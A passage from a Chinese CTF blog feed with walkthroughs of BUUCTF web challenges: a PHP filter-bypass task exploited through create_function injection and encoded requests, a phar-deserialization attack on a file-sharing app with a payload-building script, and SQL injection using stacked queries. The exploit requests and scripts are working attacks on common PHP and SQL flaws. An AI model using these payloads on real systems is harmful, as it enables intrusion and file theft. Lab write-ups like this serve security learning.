src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211208210736589.png" alt="image-20211208210736589"></p><h2 id="BJDCTF2020-EzPHP"><a href="#BJDCTF2020-EzPHP" class="headerlink" title="[BJDCTF2020]EzPHP"></a>[BJDCTF2020]EzPHP</h2><p>这个题质量好高</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211208211705547.png" alt="image-20211208211705547"></p><p>中间这个东西链接好像寄了，但是不影响做题，源码里有串base32，解码为1nD3x.php</p><p>访问这个页面</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211208211820293.png" alt="image-20211208211820293"></p><pre class="language-none"><code class="language-none">&lt;?phphighlight_file(__FILE__);error_reporting(0); $file &#x3D; &quot;1nD3x.php&quot;;$shana &#x3D; $_GET[&#39;shana&#39;];$passwd &#x3D; $_GET[&#39;passwd&#39;];$arg &#x3D; &#39;&#39;;$code &#x3D; &#39;&#39;;echo &quot;&lt;br &#x2F;&gt;&lt;font color&#x3D;red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;&#x2F;B&gt;&lt;br&gt;&lt;&#x2F;font&gt;&quot;;if($_SERVER) &#123;     if (  preg_match(&#39;&#x2F;shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#39;|log&#x2F;i&#39;, $_SERVER[&#39;QUERY_STRING&#39;])        )          die(&#39;You seem to want to do something bad?&#39;); &#125;if (!preg_match(&#39;&#x2F;http|https&#x2F;i&#39;, $_GET[&#39;file&#39;])) &#123;    if (preg_match(&#39;&#x2F;^aqua_is_cute$&#x2F;&#39;, $_GET[&#39;debu&#39;]) &amp;&amp; $_GET[&#39;debu&#39;] !&#x3D;&#x3D; &#39;aqua_is_cute&#39;) &#123;         $file &#x3D; $_GET[&quot;file&quot;];         echo &quot;Neeeeee! Good Job!&lt;br&gt;&quot;;    &#125; &#125; else die(&#39;fxck you! What do you want to do ?!&#39;);if($_REQUEST) &#123;     foreach($_REQUEST as $value) &#123;         if(preg_match(&#39;&#x2F;[a-zA-Z]&#x2F;i&#39;, $value))              die(&#39;fxck you! I hate English!&#39;);     &#125; &#125; if (file_get_contents($file) !&#x3D;&#x3D; &#39;debu_debu_aqua&#39;)    die(&quot;Aqua is the cutest five-year-old child in the world! Isn&#39;t it ?&lt;br&gt;&quot;);if ( sha1($shana) &#x3D;&#x3D;&#x3D; sha1($passwd) &amp;&amp; $shana !&#x3D; $passwd )&#123;    extract($_GET[&quot;flag&quot;]);    echo &quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;;&#125; else&#123;    die(&quot;fxck you! you don&#39;t know my password! And you don&#39;t know sha1! why you come here!&quot;);&#125;if(preg_match(&#39;&#x2F;^[a-z0-9]*$&#x2F;isD&#39;, $code) || preg_match(&#39;&#x2F;fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\&#96;|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#39;|\&#x3D;|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^&#x2F;i&#39;, $arg) ) &#123;     die(&quot;&lt;br &#x2F;&gt;Neeeeee~! I have disabled all dangerous functions! You can&#39;t get my flag &#x3D;w&#x3D;&quot;); &#125; else &#123;     include &quot;flag.php&quot;;    $code(&#39;&#39;, $arg); &#125; ?&gt;</code></pre><p>过滤了一堆东西</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211209223849475.png" alt="image-20211209223849475"></p><p>首先是这个，query_string获取的内容不会进行url解码，所以绕过这一步就只需要把传入的参数进行url编码就行</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211209224105760.png" alt="image-20211209224105760"></p><p>这里可以用换行符%0a绕过preg_match的匹配</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211209224139505.png" alt="image-20211209224139505"></p><p>这个由于检测的$_REQUEST，而对 $_REQUEST来说post的优先级大于get，所以要post传入和get内容相同的参数，把值改为数字就行</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211209224337739.png" alt="image-20211209224337739"></p><p>这个要用data://伪协议就行</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211209224412665.png" alt="image-20211209224412665"></p><p>常见的数组绕过</p><p>最后这也是最重要的地方</p><p>首先说一下<strong>create_function注入</strong></p><p><code>create_function()</code> 函数有两个参数 <code>$args</code> 和 <code>$code</code>，用于创建一个 lambda 样式的函数</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211209225145733.png" alt="image-20211209225145733"></p><p>但是我们可以通过对b进行操作，来实现这个函数的提前闭合，并写入我们想要的命令，然后通过注释符使语句合理</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211209225534763.png" alt="image-20211209225534763"></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211209224450239.png" alt="image-20211209224450239"></p><p><code>$arg</code> 和 <code>$code</code> 变量都是可控的，因为 <code>extract()</code> 函数使用数组键名作为变量名，使用数组键值作为变量值，针对数组中的每个元素，将在当前符号表中创建对应的一个变量。因此只要 <code>extract()</code> 内的数组键名为 <code>arg</code> 和 <code>code</code>，键值为我们构造的用来注入的代码，即可实现 <code>$arg</code> 和 <code>$code</code> 的变量覆盖，导致代码注入。</p><p>再利用</p><pre class="language-none"><code class="language-none">var_dump(get_defined_vars())</code></pre><p>用来输出所有变量和值</p><pre class="language-none"><code class="language-none">&#x2F;1nD3x.php?file&#x3D;%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%3b%62%61%73%65%36%34%2c%5a%47%56%69%64%56%39%6b%5a%57%4a%31%58%32%46%78%64%57%45%3d&amp;%64%65%62%75&#x3D;%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%73%68%61%6e%61[]&#x3D;1&amp;%70%61%73%73%77%64[]&#x3D;2&amp;%66%6c%61%67%5b%61%72%67%5d&#x3D;%7d%76%61%72%5f%64%75%6d%70%28%67%65%74%5f%64%65%66%69%6e%65%64%5f%76%61%72%73%28%29%29%3b%2f%2f&amp;%66%6c%61%67%5b%63%6f%64%65%5d&#x3D;%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e解码内容：&#x2F;1nD3x.php?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,ZGVidV9kZWJ1X2FxdWE&#x3D;&amp;debu&#x3D;aqua_is_cute&amp;shana[]&#x3D;1&amp;passwd[]&#x3D;2&amp;flag[arg]&#x3D;&#125;var_dump(get_defined_vars());&#x2F;&#x2F;&amp;flag[code]&#x3D;create_function</code></pre><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211209214827071.png" alt="image-20211209214827071"></p><p>但是看见flag在rea1fl4g里</p><p>所以要利用require包含这个文件然后再用get_defined_vars()读一遍试试</p><p>但是又过滤了.</p><p>所以试试base64编码</p><pre class="language-none"><code class="language-none">GET:&#x2F;1nD3x.php?file&#x3D;%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%3b%62%61%73%65%36%34%2c%5a%47%56%69%64%56%39%6b%5a%57%4a%31%58%32%46%78%64%57%45%3d&amp;%64%65%62%75&#x3D;%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%73%68%61%6e%61[]&#x3D;1&amp;%70%61%73%73%77%64[]&#x3D;2&amp;%66%6c%61%67%5b%61%72%67%5d&#x3D;%7d%72%65%71%75%69%72%65%28%62%61%73%65%36%34%5f%64%65%63%6f%64%65%28%63%6d%56%68%4d%57%5a%73%4e%47%63%75%63%47%68%77%29%29%3b%76%61%72%5f%64%75%6d%70%28%67%65%74%5f%64%65%66%69%6e%65%64%5f%76%61%72%73%28%29%29%3b%2f%2f&amp;%66%6c%61%67%5b%63%6f%64%65%5d&#x3D;%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6ePOST:file&#x3D;1&amp;debu&#x3D;1&amp;shana[]&#x3D;1&amp;passwd[]&#x3D;1</code></pre><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211209215908383.png" alt="image-20211209215908383"></p><p>还是不行，尝试伪协议读源码了只能</p><p>require(php://filter/read=convert.base64-encode/resource=rea1fl4g.php)</p><p>采用取反绕过过滤</p><pre class="language-none"><code class="language-none">GET:&#x2F;1nD3x.php?file&#x3D;%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%3b%62%61%73%65%36%34%2c%5a%47%56%69%64%56%39%6b%5a%57%4a%31%58%32%46%78%64%57%45%3d&amp;%64%65%62%75&#x3D;%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%73%68%61%6e%61[]&#x3D;1&amp;%70%61%73%73%77%64[]&#x3D;2&amp;%66%6c%61%67%5b%61%72%67%5d&#x3D;&#125;require(~(%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f));&#x2F;&#x2F;&amp;%66%6c%61%67%5b%63%6f%64%65%5d&#x3D;%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e&#x2F;&#x2F;这里不知道为什么把require也取反就没法用了POST:file&#x3D;1&amp;debu&#x3D;1&amp;shana[]&#x3D;1&amp;passwd[]&#x3D;1&#x2F;&#x2F; preg_match() 只能匹配字符串，数组得以绕过。</code></pre><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211209232958132.png" alt="image-20211209232958132"></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211209221809797.png" alt="image-20211209221809797"></p><p><a href="https://blog.gem-love.com/ctf/770.html">2020BJDCTF “EzPHP” +Y1ngCTF “Y1ng’s Baby Code” 官方writeup – 颖奇L&#39;Amore (gem-love.com)</a></p><p>原题用异或也可以，贴个脚本先，万一以后能用到</p><pre class="language-none"><code class="language-none">#Author: piCEBDC7str_&#x3D; &#39;1flag.php&#39;str_&#x3D;list(str_)final&#x3D;&#39;&#39;for x in str_:    print(hex(~ord(x)&amp;0xff))    final+&#x3D;hex(~ord(x)&amp;0xff)print(str_)final &#x3D; final.replace(&#39;0x&#39;,&#39;%&#39;)final+&#x3D;&#39;^&#39;for x in range(len(str_)):    final+&#x3D;r&#39;%ff&#39;print(final)</code></pre><p>取反脚本</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?&#x2F;&#x2F;Author: 颖奇L&#39;Amore&#x2F;&#x2F;Blog: www.gem-love.com$a &#x3D; &quot;p h p : &#x2F; &#x2F; f i l t e r &#x2F; r e a d &#x3D; c o n v e r t . b a s e 6 4 - e n c o d e &#x2F; r e s o u r c e &#x3D; 1 f l a g . p h p&quot;;$arr1 &#x3D; explode(&#39; &#39;, $a);echo &quot;&lt;br&gt;~(&quot;;foreach ($arr1 as $key &#x3D;&gt; $value) &#123;echo &quot;%&quot;.bin2hex(~$value);&#125;echo &quot;)&lt;br&gt;&quot;;</code></pre><p>用羽师傅那个也行</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211209235444083.png" alt="image-20211209235444083"></p><h2 id="CISCN2019-华北赛区-Day1-Web1-Dropbox"><a href="#CISCN2019-华北赛区-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web1]Dropbox"></a>[CISCN2019 华北赛区 Day1 Web1]Dropbox</h2><p>知识点：phar的反序列化</p><p>传个jpg文件然后下载的时候抓包有个filename，这里可以实现任意文件读取</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211210213306758.png" alt="image-20211210213306758"></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211210213358180.png" alt="image-20211210213358180"></p><p>index.php</p><pre class="language-none"><code class="language-none">&lt;?phpsession_start();if (!isset($_SESSION[&#39;login&#39;])) &#123;    header(&quot;Location: login.php&quot;);    die();&#125;?&gt;&lt;?phpinclude &quot;class.php&quot;;$a &#x3D; new FileList($_SESSION[&#39;sandbox&#39;]);$a-&gt;Name();$a-&gt;Size();?&gt;</code></pre><p>download.php</p><pre class="language-none"><code class="language-none">&lt;?phpsession_start();if (!isset($_SESSION[&#39;login&#39;])) &#123;    header(&quot;Location: login.php&quot;);    die();&#125;if (!isset($_POST[&#39;filename&#39;])) &#123;    die();&#125;include &quot;class.php&quot;;ini_set(&quot;open_basedir&quot;, getcwd() . &quot;:&#x2F;etc:&#x2F;tmp&quot;);chdir($_SESSION[&#39;sandbox&#39;]);$file &#x3D; new File();$filename &#x3D; (string) $_POST[&#39;filename&#39;];if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename) &amp;&amp; stristr($filename, &quot;flag&quot;) &#x3D;&#x3D;&#x3D; false) &#123;    Header(&quot;Content-type: application&#x2F;octet-stream&quot;);    Header(&quot;Content-Disposition: attachment; filename&#x3D;&quot; . basename($filename));    echo $file-&gt;close();&#125; else &#123;    echo &quot;File not exist&quot;;&#125;?&gt;</code></pre><p>login.php</p><pre class="language-none"><code class="language-none">&lt;?phpsession_start();if (isset($_SESSION[&#39;login&#39;])) &#123;    header(&quot;Location: index.php&quot;);    die();&#125;?&gt;&lt;?phpinclude &quot;class.php&quot;;if (isset($_GET[&#39;register&#39;])) &#123;    echo &quot;&lt;script&gt;toast(&#39;注册成功&#39;, &#39;info&#39;);&lt;&#x2F;script&gt;&quot;;&#125;if (isset($_POST[&quot;username&quot;]) &amp;&amp; isset($_POST[&quot;password&quot;])) &#123;    $u &#x3D; new User();    $username &#x3D; (string) $_POST[&quot;username&quot;];    $password &#x3D; (string) $_POST[&quot;password&quot;];    if (strlen($username) &lt; 20 &amp;&amp; $u-&gt;verify_user($username, $password)) &#123;        $_SESSION[&#39;login&#39;] &#x3D; true;        $_SESSION[&#39;username&#39;] &#x3D; htmlentities($username);        $sandbox &#x3D; &quot;uploads&#x2F;&quot; . sha1($_SESSION[&#39;username&#39;] . &quot;sftUahRiTz&quot;) . &quot;&#x2F;&quot;;        if (!is_dir($sandbox)) &#123;            mkdir($sandbox);        &#125;        $_SESSION[&#39;sandbox&#39;] &#x3D; $sandbox;        echo(&quot;&lt;script&gt;window.location.href&#x3D;&#39;index.php&#39;;&lt;&#x2F;script&gt;&quot;);        die();    &#125;    echo &quot;&lt;script&gt;toast(&#39;账号或密码错误&#39;, &#39;warning&#39;);&lt;&#x2F;script&gt;&quot;;&#125;?&gt;</code></pre><p>class.php</p><pre class="language-none"><code class="language-none">&lt;?phperror_reporting(0);$dbaddr &#x3D; &quot;127.0.0.1&quot;;$dbuser &#x3D; &quot;root&quot;;$dbpass &#x3D; &quot;root&quot;;$dbname &#x3D; &quot;dropbox&quot;;$db &#x3D; new mysqli($dbaddr, $dbuser, $dbpass, $dbname);class User &#123;    public $db;    public function __construct() &#123;        global $db;        $this-&gt;db &#x3D; $db;    &#125;    public function user_exist($username) &#123;        $stmt &#x3D; $this-&gt;db-&gt;prepare(&quot;SELECT &#96;username&#96; FROM &#96;users&#96; WHERE &#96;username&#96; &#x3D; ? LIMIT 1;&quot;);        $stmt-&gt;bind_param(&quot;s&quot;, $username);        $stmt-&gt;execute();        $stmt-&gt;store_result();        $count &#x3D; $stmt-&gt;num_rows;        if ($count &#x3D;&#x3D;&#x3D; 0) &#123;            return false;        &#125;        return true;    &#125;    public function add_user($username, $password) &#123;        if ($this-&gt;user_exist($username)) &#123;            return false;        &#125;        $password &#x3D; sha1($password . &quot;SiAchGHmFx&quot;);        $stmt &#x3D; $this-&gt;db-&gt;prepare(&quot;INSERT INTO &#96;users&#96; (&#96;id&#96;, &#96;username&#96;, &#96;password&#96;) VALUES (NULL, ?, ?);&quot;);        $stmt-&gt;bind_param(&quot;ss&quot;, $username, $password);        $stmt-&gt;execute();        return true;    &#125;    public function verify_user($username, $password) &#123;        if (!$this-&gt;user_exist($username)) &#123;            return false;        &#125;        $password &#x3D; sha1($password . &quot;SiAchGHmFx&quot;);        $stmt &#x3D; $this-&gt;db-&gt;prepare(&quot;SELECT &#96;password&#96; FROM &#96;users&#96; WHERE &#96;username&#96; &#x3D; ?;&quot;);        $stmt-&gt;bind_param(&quot;s&quot;, $username);        $stmt-&gt;execute();        $stmt-&gt;bind_result($expect);        $stmt-&gt;fetch();        if (isset($expect) &amp;&amp; $expect &#x3D;&#x3D;&#x3D; $password) &#123;            return true;        &#125;        return false;    &#125;    public function __destruct() &#123;        $this-&gt;db-&gt;close();    &#125;&#125;class FileList &#123;    private $files;    private $results;    private $funcs;    public function __construct($path) &#123;        $this-&gt;files &#x3D; array();        $this-&gt;results &#x3D; array();        $this-&gt;funcs &#x3D; array();        $filenames &#x3D; scandir($path);        $key &#x3D; array_search(&quot;.&quot;, $filenames);        unset($filenames[$key]);        $key &#x3D; array_search(&quot;..&quot;, $filenames);        unset($filenames[$key]);        foreach ($filenames as $filename) &#123;            $file &#x3D; new File();            $file-&gt;open($path . $filename);            array_push($this-&gt;files, $file);            $this-&gt;results[$file-&gt;name()] &#x3D; array();        &#125;    &#125;    public function __call($func, $args) &#123;        array_push($this-&gt;funcs, $func);        foreach ($this-&gt;files as $file) &#123;            $this-&gt;results[$file-&gt;name()][$func] &#x3D; $file-&gt;$func();        &#125;    &#125;    public function __destruct() &#123;        $table &#x3D; &#39;&lt;div id&#x3D;&quot;container&quot; class&#x3D;&quot;container&quot;&gt;&lt;div class&#x3D;&quot;table-responsive&quot;&gt;&lt;table id&#x3D;&quot;table&quot; class&#x3D;&quot;table table-bordered table-hover sm-font&quot;&gt;&#39;;        $table .&#x3D; &#39;&lt;thead&gt;&lt;tr&gt;&#39;;        foreach ($this-&gt;funcs as $func) &#123;            $table .&#x3D; &#39;&lt;th scope&#x3D;&quot;col&quot; class&#x3D;&quot;text-center&quot;&gt;&#39; . htmlentities($func) . &#39;&lt;&#x2F;th&gt;&#39;;        &#125;        $table .&#x3D; &#39;&lt;th scope&#x3D;&quot;col&quot; class&#x3D;&quot;text-center&quot;&gt;Opt&lt;&#x2F;th&gt;&#39;;        $table .&#x3D; &#39;&lt;&#x2F;thead&gt;&lt;tbody&gt;&#39;;        foreach ($this-&gt;results as $filename &#x3D;&gt; $result) &#123;            $table .&#x3D; &#39;&lt;tr&gt;&#39;;            foreach ($result as $func &#x3D;&gt; $value) &#123;                $table .&#x3D; &#39;&lt;td class&#x3D;&quot;text-center&quot;&gt;&#39; . htmlentities($value) . &#39;&lt;&#x2F;td&gt;&#39;;            &#125;            $table .&#x3D; &#39;&lt;td class&#x3D;&quot;text-center&quot; filename&#x3D;&quot;&#39; . htmlentities($filename) . &#39;&quot;&gt;&lt;a href&#x3D;&quot;#&quot; class&#x3D;&quot;download&quot;&gt;下载&lt;&#x2F;a&gt; &#x2F; &lt;a href&#x3D;&quot;#&quot; class&#x3D;&quot;delete&quot;&gt;删除&lt;&#x2F;a&gt;&lt;&#x2F;td&gt;&#39;;            $table .&#x3D; &#39;&lt;&#x2F;tr&gt;&#39;;        &#125;        echo $table;    &#125;&#125;class File &#123;    public $filename;    public function open($filename) &#123;        $this-&gt;filename &#x3D; $filename;        if (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123;            return true;        &#125; else &#123;            return false;        &#125;    &#125;    public function name() &#123;        return basename($this-&gt;filename);    &#125;    public function size() &#123;        $size &#x3D; filesize($this-&gt;filename);        $units &#x3D; array(&#39; B&#39;, &#39; KB&#39;, &#39; MB&#39;, &#39; GB&#39;, &#39; TB&#39;);        for ($i &#x3D; 0; $size &gt;&#x3D; 1024 &amp;&amp; $i &lt; 4; $i++) $size &#x2F;&#x3D; 1024;        return round($size, 2).$units[$i];    &#125;    public function detele() &#123;        unlink($this-&gt;filename);    &#125;    public function close() &#123;        return file_get_contents($this-&gt;filename);    &#125;&#125;?&gt;</code></pre><p>delete.php</p><pre class="language-none"><code class="language-none">&lt;?phpsession_start();if (!isset($_SESSION[&#39;login&#39;])) &#123;    header(&quot;Location: login.php&quot;);    die();&#125;if (!isset($_POST[&#39;filename&#39;])) &#123;    die();&#125;include &quot;class.php&quot;;chdir($_SESSION[&#39;sandbox&#39;]);$file &#x3D; new File();$filename &#x3D; (string) $_POST[&#39;filename&#39;];if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename)) &#123;    $file-&gt;detele();    Header(&quot;Content-type: application&#x2F;json&quot;);    $response &#x3D; array(&quot;success&quot; &#x3D;&gt; true, &quot;error&quot; &#x3D;&gt; &quot;&quot;);    echo json_encode($response);&#125; else &#123;    Header(&quot;Content-type: application&#x2F;json&quot;);    $response &#x3D; array(&quot;success&quot; &#x3D;&gt; false, &quot;error&quot; &#x3D;&gt; &quot;File not exist&quot;);    echo json_encode($response);&#125;?&gt;</code></pre><p>phar反序列化利用条件：</p><p>1）phar文件要能够上传至服务器</p><p>2）要有可用的魔术方法为跳板</p><p>3）文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤</p><p>对于本题而言，第一条满足，第二条有一个魔术方法__call()和FileList类、User类的__destruct()，恐怕想不利用它们也不行，第三条后半部分没问题，前半部分则需要我们找一找。</p><p>既曰文件操作函数，就应该在本题的File类（至多也在FileList类）的方法中寻找，毕竟整个题目基本上都是在面向对象的基础上编程，对文件的操作也都是对File类的对象的操作，</p><p>我们看到，open()方法调用了file_exists()和is_dir()函数（注意name方法里的basename函数不算），size()方法调用了filesize()函数，delete()方法调用了unlink()函数，close()方法file_get_contents()函数。</p><p>我们前面提到了，本题要读取/flag.txt文件，故刚刚列举的这些函数中，虽然文件操作函数不少，可以用来触发反序列化，对读取文件有用的只有close()方法中的file_get_contents()函数这一个，所以我们可以对它分析，</p><p>这个时候，如果想不到__call()方法和__destruct()方法，基本上就可以放弃了，在phar题目里，魔术方法一般来讲是必须要用的，</p><p><img src="https://upload-images.jianshu.io/upload_images/18851076-8640cc264961f33a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/799/format/webp" alt="img"></p><p>这里我们看到，FileList的__call()方法语义简单，就是遍历files数组，对每一个file变量执行一次$func，然后将结果存进$results数组，</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220206173648992.png" alt="image-20220206173648992"></p><p>接下来的__destruct函数会将FileList对象的funcs变量和results数组中的内容以HTML表格的形式输出在index.php上（我们可以看到，index.php里创建了一个FileList对象，在脚本执行完毕后触发__destruct，则会输出该用户目录下的文件信息），</p><p>User对象的__destruct()方法，</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220206173602900.png" alt="image-20220206173602900"></p><p>无非就是 脚本执行完毕后，执行$db的close()的方法（来关闭数据库连接），但话说回来，没有括号里的话，这句话依然成立，而且这个&#39;close&#39;与File类中的close()方法同名。所以，当db的值为一个FileList对象时，User对象析构之时，会触发FileList-&gt;close()，但FileList里没有这个方法，于是调用_call函数，进而执行file_get_contents($filename)，读取了文件内容。整个链的结构也很简单清晰：在我们控制$db为一个FileList对象的情况下，$user-&gt;__destruct() =&gt; $db-&gt;close() =&gt; $db-&gt;__call(&#39;close&#39;) =&gt; $file-&gt;close() =&gt; $results=file_get_contents($filename) =&gt; FileList-&gt;__destruct()输出$result。</p><p>反序列化脚本</p><pre class="language-none"><code class="language-none">&lt;?php    class User &#123;        public $db;    &#125;     class File&#123;        public $filename;        public function __construct($name)&#123;            $this-&gt;filename&#x3D;$name;        &#125;    &#125;    class FileList &#123;        private $files;        public function __construct()&#123;            $this-&gt;files&#x3D;array(new File(&#39;&#x2F;flag.txt&#39;));        &#125;    &#125;     $o &#x3D; new User();    $o-&gt;db &#x3D;new FileList();    @unlink(&quot;phar.phar&quot;);    $phar &#x3D; new Phar(&quot;phar.phar&quot;);    $phar-&gt;startBuffering();    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);    $phar-&gt;setMetadata($o);    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);     $phar-&gt;stopBuffering();?&gt;</code></pre><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211210220146818.png" alt="image-20211210220146818"></p><p>参考文章</p><p>[<a href="https://www.jianshu.com/p/5b91e0b7f3ac">CISCN2019 华北赛区 Day1 Web1]Dropbox之愚见 - 简书 (jianshu.com)</a></p><p>[(24条消息) 关于phar反序列化——BUUCTF-<a href="https://blog.csdn.net/silence1_/article/details/102683254">CISCN2019 华北赛区 Day1 Web1]Dropbox_silence1_的博客-CSDN博客_buuctf 反序列化</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql题wp</title>
      <link href="/2021/06/16/buu-sql%E9%A2%98wp/"/>
      <url>/2021/06/16/buu-sql%E9%A2%98wp/</url>
      
        <content type="html"><![CDATA[<p> sql好难.jpg</p> <span id="more"></span><h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/sql/image-20210615120304661.png" alt="image-20210615120304661"></p><p>用户框里输入单引号出现报错，猜测为字符型注入</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/sql/image-20210615121140407.png" alt="image-20210615121140407"></p><p>利用1&#39;or 1#注入得到flag</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/sql/image-20210615121210956.png" alt="image-20210615121210956"></p><h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p>先试一下万能密码</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/sql/image-20210615214551313.png" alt="image-20210615214551313"></p><p>利用1‘ order by 可以试出该表中存在两个字段</p><p>接下来要用堆叠查询（利用分号执行多个sql语句）</p><p>尝试先查询数据库</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/sql/image-20210615214516623.png" alt="image-20210615214516623"></p><p>成功。</p><p>再查询表名</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/sql/image-20210615214901418.png" alt="image-20210615214901418"></p><p>看到有两个表，查询两个表中的字段</p><p>words表内存在两个字段</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/sql/image-20210615215132406.png" alt="image-20210615215132406"></p><p>1919810931114514表内存在一个字段，flag在该表内。</p><p>（查询该表时表名要在反单引号内）</p><p>1&#39;;show columns from <code>1919810931114514</code>#</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/sql/image-20210615215232514.png" alt="image-20210615215232514"></p><p>所以可以猜测</p><p>内部查询语句类似 : select id, data from words where id =</p><p>所以要把words表改为word1，将flag所在的表表名改为words，然后将flag改名为id；</p><p>payload：1&#39;;rename table words to word1;rename table <code>1919810931114514</code> to words; alert table words change flag id varchar(100);# </p><p>再用1’ or 1#注入</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/sql/image-20210615232041458.png" alt="image-20210615232041458"></p><p>也可以把words表改为words，将flag所在的表表名改为words，再为其添加id列，并将flag改为data</p><p>payload：1&#39;;rename table words to word1;rename table <code>1919810931114514</code> to words;alter table words add id int unsigned not Null auto_increment primary key; alert table words change flag data varchar(100);# </p><p>再将1提交可直接获得flag</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/sql/image-20210615232008605.png" alt="image-20210615232008605"></p><h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><p>进入后输入1有回显</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/sql/image-20210617020541195.png" 